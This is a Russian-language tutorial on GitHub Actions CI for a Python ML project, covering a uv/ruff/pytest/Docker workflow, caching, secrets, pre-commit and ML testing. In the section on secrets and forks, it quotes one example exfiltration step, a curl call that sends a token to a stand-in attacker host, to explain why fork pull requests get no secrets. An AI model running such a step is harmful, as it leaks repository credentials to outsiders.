CI: тесты и линтер на каждый коммит

10 мин АЛАртем Лебедевич 10 ноября 2026

Continuous Integration (CI) — это автоматическая проверка каждого изменения на чистой машине: установить зависимости с нуля, прогнать линтер и тесты, при необходимости собрать образ. Она ловит то, что «у меня на ноутбуке работает»: забытую зависимость, сломанный импорт, тест, который зависит от вашего локального файла. Для ML-инженера CI — ещё и страховка от тихих поломок препроцессинга и формата данных, о которых иначе узнают по упавшей метрике.

Концепции GitHub Actions

  • Workflow — YAML-файл в .github/workflows/; описывает автоматизацию целиком.
  • Trigger (on:) — событие запуска: push, pull_request, schedule (cron), workflow_dispatch (кнопка), release.
  • Job — набор шагов на одной машине. Jobs по умолчанию идут параллельно; зависимость задаётся через needs:.
  • Runner — машина, на которой выполняется job. ubuntu-latest — виртуальная машина, которую GitHub создаёт на время job и удаляет после; ничего между запусками на ней не остаётся (кроме явного кэша).
  • Step — либо команда (run:), либо готовое действие (uses:).

Мысленная модель: вы пишете скрипт «с нуля поставить и проверить», а GitHub гоняет его на каждый коммит в чистой ВМ. Если скрипт зелёный, у вас есть воспроизводимость; если красный — это не «баг CI», а реальная разница между вашей машиной и чистой.

Рабочий ci.yml

Проект на uv: зависимости и их версии зафиксированы в uv.lock, а ruff и pytest лежат в dev-группе.

yaml
name: CI

on:
  push:
    branches: [main]
  pull_request:

permissions:
  contents: read

concurrency:
  group: ci-${{ github.ref }}
  cancel-in-progress: true

jobs:
  test:
    runs-on: ubuntu-latest
    timeout-minutes: 15
    strategy:
      fail-fast: false
      matrix:
        python-version: ["3.12", "3.13"]
    steps:
      - uses: actions/checkout@v7

      - uses: astral-sh/setup-uv@v10.3.3
        with:
          python-version: ${{ matrix.python-version }}
          enable-cache: true

      - name: Install dependencies
        run: uv sync --locked

      - name: Lint
        run: |
          uv run ruff check .
          uv run ruff format --check .

      - name: Tests
        run: uv run pytest -q

  docker:
    needs: test
    runs-on: ubuntu-latest
    timeout-minutes: 15
    steps:
      - uses: actions/checkout@v7

      - uses: astral-sh/setup-uv@v10.3.3
        with:
          enable-cache: true

      - name: Train model artifact (synthetic data)
        run: uv sync --locked && uv run python -m churn.train

      - uses: docker/setup-buildx-action@v4

      - uses: docker/build-push-action@v7
        with:
          context: .
          push: false
          tags: churn:ci
          cache-from: type=gha
          cache-to: type=gha,mode=max

Модель обучается в CI до сборки образа, потому что Dockerfile делает COPY artifacts ./artifacts, а каталог artifacts/ в .gitignore: на свежем чекауте артефакта нет, и сборка без этого шага падает.

Разберём не очевидное.

  • uv sync --locked падает, если uv.lock не соответствует pyproject.toml. Это ровно то, что нужно: забыли закоммитить обновлённый lock-файл — CI красный, а не «у коллеги стоят другие версии».
  • permissions: contents: read — токен workflow получает минимум прав; расширяйте точечно, если job что-то публикует.
  • concurrency отменяет устаревший запуск при новом пуше в ту же ветку и экономит минуты.
  • timeout-minutes защищает от зависшего теста, который сжёг бы весь лимит.
  • Версии действий — актуальные на ноябрь 2026 (actions/checkout v7, docker/build-push-action v7, docker/setup-buildx-action v4). У astral-sh/setup-uv нет «плавающего» тега major-версии, поэтому указана полная v10.3.3; сверяйте теги на страницах репозиториев в разделе Releases. Для критичных репозиториев фиксируют действие по хэшу коммита.

Кэш

enable-cache: true у setup-uv сохраняет кэш uv между запусками; ключ строится по uv.lock и другим файлам зависимостей, так что при смене зависимостей кэш обновится сам. Кэш слоёв Docker (type=gha) работает аналогично. Кэш — оптимизация: сборка должна проходить и без него.

Matrix

matrix запускает один job в нескольких вариантах: версии Python, ОС, версии ключевой библиотеки. Для сервиса достаточно версии, которую вы используете в продакшене, плюс следующей; для библиотеки — все поддерживаемые. fail-fast: false не обрывает остальные варианты после первого падения: вы видите полную картину.

Секреты и форки

Секреты (Settings → Secrets and variables → Actions) доступны как ${{ secrets.NAME }} и маскируются в логах. Передавайте их только в шаги, которым они нужны:

yaml
      - name: Push image
        env:
          REGISTRY_TOKEN: ${{ secrets.REGISTRY_TOKEN }}
        run: echo "$REGISTRY_TOKEN" | docker login ghcr.io -u "$GITHUB_ACTOR" --password-stdin

Для pull request из форка секреты не передаются, а токен получает только права на чтение: иначе любой мог бы открыть PR с шагом run: curl evil.example -d "$TOKEN" и украсть секреты. Поэтому тесты не должны требовать секретов; всё, что требует, — отдельный job на push в main. Отдельная опасность — триггер pull_request_target, который исполняется с секретами и правами базового репозитория: не запускайте в нём код из PR.

Секрет в логе

GitHub маскирует точное значение секрета, но не его производные (base64, часть строки). Не печатайте env и не включайте set -x в шагах с секретами.

Docker-образ в CI

Job docker выше только собирает образ без публикации: этого достаточно, чтобы поймать сломанный Dockerfile. Публикацию (push: true и вход в реестр, например GitHub Container Registry) добавляйте только для main и с правом packages: write на уровне job, а не всего workflow. Подробно про образы — в статье Docker.

Бейдж и pre-commit

Статус workflow выводится бейджем в README (замените OWNER/REPO на свои):

text
![CI](https://github.com/OWNER/REPO/actions/workflows/ci.yml/badge.svg)

Чтобы красный CI не стал сюрпризом, те же проверки гоняют локально перед коммитом через pre-commit:

yaml
# .pre-commit-config.yaml
repos:
  - repo: https://github.com/astral-sh/ruff-pre-commit
    rev: v0.17.4
    hooks:
      - id: ruff-check
        args: [--fix]
      - id: ruff-format

Установка: uv add --dev pre-commit && uv run pre-commit install. Локальный хук — удобство, CI — гарантия: хук можно обойти флагом --no-verify, CI — нет. Значение rev подставьте актуальное из релизов репозитория.

Что тестировать в ML-проекте

Модель на accuracy не проверишь юнит-тестом, зато вокруг неё много детерминированного кода, где ошибки дороги:

  • Схема данных: колонки, типы, допустимые диапазоны, доля пропусков (pandera, pydantic или ручные assert).
  • Формы: на выходе препроцессинга число признаков и порядок колонок совпадают с тем, что ждёт модель.
  • Детерминизм препроцессинга: одинаковый вход даёт одинаковый выход; fit на трейне, transform на тесте, никаких утечек.
  • Смоук-обучение: fit на 200 строках за секунды, затем predict возвращает нужную форму и значения в [0,1]. Метрику здесь не оцениваем, проверяем, что пайплайн целиком не падает.
  • Контракт сервиса: /healthz отвечает 200, /predict возвращает ожидаемые поля (TestClient из FastAPI, см. HTTP и FastAPI).
python
import numpy as np
from sklearn.linear_model import LogisticRegression


def test_smoke_train_predict():
    rng = np.random.default_rng(0)
    X = rng.normal(size=(200, 5))
    y = (X[:, 0] + rng.normal(scale=0.5, size=200) > 0).astype(int)
    model = LogisticRegression().fit(X, y)
    p = model.predict_proba(X[:10])[:, 1]
    assert p.shape == (10,) and ((p >= 0) & (p <= 1)).all()

Бесплатные минуты на GitHub Actions ограничены и зависят от типа репозитория и тарифа; актуальные лимиты смотрите на странице биллинга GitHub. Тяжёлое обучение в CI не запускайте.

Ловушки

  • Зелёный CI без единого теста: «проверка» ничего не проверяет.
  • Тесты читают файл с вашего ноутбука или обращаются к сети и базе, которых нет на раннере.
  • pip install без lock-файла: сегодня зелёное, завтра красное из-за новой версии зависимости.
  • Секреты в echo, в артефактах, в pull_request_target с чужим кодом.
  • Версии действий не обновляются годами (или, наоборот, @main вместо тега).
  • Спрашивают на собеседовании: чем CI отличается от CD; как ускорить пайплайн (кэш, параллельные jobs, needs); почему секреты не доходят до PR из форка; что тестировать в ML-проекте и чем смоук-тест отличается от юнит-теста.

Проверь себя

Зачем `uv sync --locked`, а не просто `uv sync`?

--locked падает, если uv.lock расходится с pyproject.toml; обычный sync молча обновил бы lock. В CI нужна проверка, что закоммичено именно то окружение, которое вы тестировали.

Почему PR из форка не получает секреты репозитория?

Автор форка контролирует код workflow в PR и мог бы вывести секреты наружу. Поэтому такие запуски идут без секретов и с токеном только на чтение.

Чем кэш отличается от артефакта?

Кэш — оптимизация, ключ вычисляется по зависимостям, его может не оказаться; артефакт — результат конкретного запуска, который вы сохраняете и скачиваете.

Какие тесты написать для препроцессинга признаков?

Схема входа, порядок и число колонок на выходе, детерминизм на одном входе, отсутствие обращения к тестовым данным при fit, поведение на пропусках и неизвестных категориях.
